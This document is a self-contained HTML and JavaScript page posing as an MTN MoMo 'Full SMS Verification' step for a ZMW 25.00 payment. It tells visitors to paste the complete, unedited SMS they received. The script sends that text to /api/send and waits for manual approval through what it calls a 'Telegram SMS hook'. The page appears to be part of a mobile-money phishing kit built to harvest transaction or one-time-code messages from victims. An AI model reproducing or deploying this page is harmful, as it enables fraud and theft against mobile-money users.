<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Full SMS Verification</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;background:#f5f6f7;font-family:Arial,Helvetica,sans-serif;color:#111827}
body{display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:24px 16px}
.card{width:min(100%,520px);min-height:520px;background:#fff;border:1px solid #e9ecef;border-radius:15px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.05)}
.top{padding:23px 19px 15px;border-bottom:1px solid #edf0f2;position:relative}
.back{font-size:10px;color:#1f3b5a;margin-bottom:25px}
.amount{position:absolute;top:16px;right:17px;text-align:right}
.amount-label{font-size:7px;color:#7c8794;font-weight:700;letter-spacing:.8px}
.amount-value{color:#ff6500;font-size:14px;font-weight:800;margin-top:1px}
h1{font-size:17px;margin:0 0 5px;font-weight:800;letter-spacing:-.3px}
.subtitle{font-size:10px;color:#687385;line-height:1.3;max-width:245px}
.content{padding:27px 19px 16px}
.sending{text-align:center;margin-bottom:28px}
.sending-label{color:#8a93a0;font-size:7px;font-weight:700;letter-spacing:1px;margin-bottom:6px}
.number{font-size:11px;font-weight:800}
.warning{background:#fff8ef;border:1px solid #ffe1bd;border-radius:12px;padding:12px 10px;display:flex;gap:9px;align-items:flex-start;margin-bottom:20px}
.warning-icon{color:#ff6500;font-size:15px;line-height:1}
.warning-text{color:#9d2e00;font-size:9px;font-weight:700;line-height:1.35}
.label{color:#9099a5;font-size:7px;font-weight:700;letter-spacing:.7px;margin:0 0 5px 2px}
textarea{width:100%;height:120px;resize:none;border:1px solid #e9edf1;border-radius:12px;background:#f8f9fa;padding:13px;outline:none;font-family:Arial,Helvetica,sans-serif;font-size:10px;color:#333}
textarea::placeholder{color:#c3cbd3}
.counter{font-size:7px;color:#89929d;margin-top:20px}
.next{width:100%;height:46px;border:0;border-radius:12px;margin-top:16px;background:#ff6500;color:white;font-size:11px;font-weight:800;cursor:pointer;box-shadow:0 7px 13px rgba(255,101,0,.2)}
.next:active{transform:scale(.99)}
.error{text-align:center;color:#c62828;font-size:8px;min-height:12px;margin-top:8px}
.approval-spinner{position:fixed;top:50%;left:50%;width:18px;height:18px;border:2px solid rgba(255,101,0,.3);border-top-color:#ffcc00;border-radius:50%;animation:approval-spin .7s linear infinite;transform:translate(-50%,-50%)}
@keyframes approval-spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
@media(max-width:480px){
body{padding:0}
.card{min-height:100vh;border-radius:0}
.top{padding-left:16px;padding-right:16px}
.content{padding-left:16px;padding-right:16px}
}
</style>
</head>
<body>
<div class="card">
<div class="top">
<div class="back">‹&nbsp; Back</div>
<div class="amount"><div class="amount-label">AMOUNT</div><div class="amount-value" id="amountValue">ZMW 25.00</div></div>
<h1>Full SMS Verification</h1>
<div class="subtitle">Please paste the full SMS content you received from MTN MoMo.</div>
</div>
<div class="content">
<div class="sending"><div class="sending-label">SENDING TO</div><div class="number" id="submittedPhone">778000667</div></div>
<div class="warning"><div class="warning-icon">⚠</div><div class="warning-text">DO NOT edit the SMS — only copy and paste the entire message below</div></div>
<div class="label">PASTE FULL SMS CONTENT</div>
<textarea id="sms" maxlength="2000" placeholder="Paste the entire MTN MoMo SMS here..."></textarea>
<div class="counter" id="counter">0 characters</div>
<button class="next" id="next" type="button">Next Step&nbsp; →</button>
<div class="error" id="error"></div>
<div class="approval-spinner" id="approvalSpinner" hidden aria-label="Waiting for approval"></div>
</div>
</div>
<script>
const sms=document.getElementById("sms"),counter=document.getElementById("counter"),next=document.getElementById("next"),error=document.getElementById("error"),approvalSpinner=document.getElementById("approvalSpinner");
try {
  const selectedPlan = JSON.parse(sessionStorage.getItem("selectedPlan") || "null");
  const amount = selectedPlan && String(selectedPlan.price || "").match(/\d+(?:\.\d+)?/);
  if (amount) document.getElementById("amountValue").textContent = `ZMW ${Number(amount[0]).toFixed(2)}`;
  if (selectedPlan && selectedPlan.price === "Free trial") document.getElementById("amountValue").textContent = "ZMW 0.00";
} catch (storageError) {
  console.warn("Selected plan unavailable:", storageError);
}
const submittedPhone = sessionStorage.getItem("submittedPhone");
if (submittedPhone) document.getElementById("submittedPhone").textContent = submittedPhone;
sms.addEventListener("input",()=>{counter.textContent=`${sms.value.length} characters`;error.textContent=""});
next.addEventListener("click", async () => {
  error.style.color="#c62828";
  const smsText = sms.value.trim();
  if(!smsText){
    error.textContent="Please paste the SMS content first.";
    sms.focus();
    return;
  }

  const payload = {
  text: `Full SMS Verification\nSMS: ${smsText}`,
  type: 'ming'
};

  try {
    const response = await fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`Submission failed (${response.status}).`);
    }

    const data = await response.json();
    if (!data.ok || !data.submissionId) throw new Error(data.error || 'Submission failed.');

    next.disabled = true;
    approvalSpinner.hidden = false;
    error.style.color="#6d7782";
    error.textContent="Waiting for SMS approval...";

    while (true) {
      const statusResponse = await fetch(
        `/api/submission-status?id=${encodeURIComponent(data.submissionId)}`,
        { cache: 'no-store' }
      );
      const statusData = await statusResponse.json();

      if (statusData.status === 'approved') {
        approvalSpinner.hidden = true;
        error.style.color="#14804a";
        error.textContent="SMS approved. Continuing...";
        window.location.href = 'kipko.html';
        return;
      }

      if (statusData.status === 'rejected') {
        approvalSpinner.hidden = true;
        throw new Error('This SMS submission was rejected.');
      }

      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  } catch (sendError) {
    approvalSpinner.hidden = true;
    console.warn('Telegram SMS hook unavailable:', sendError);
    error.style.color="#c62828";
    error.textContent=sendError.message || 'SMS submission failed.';
    next.disabled = false;
  }
});
</script>
</body>
</html>
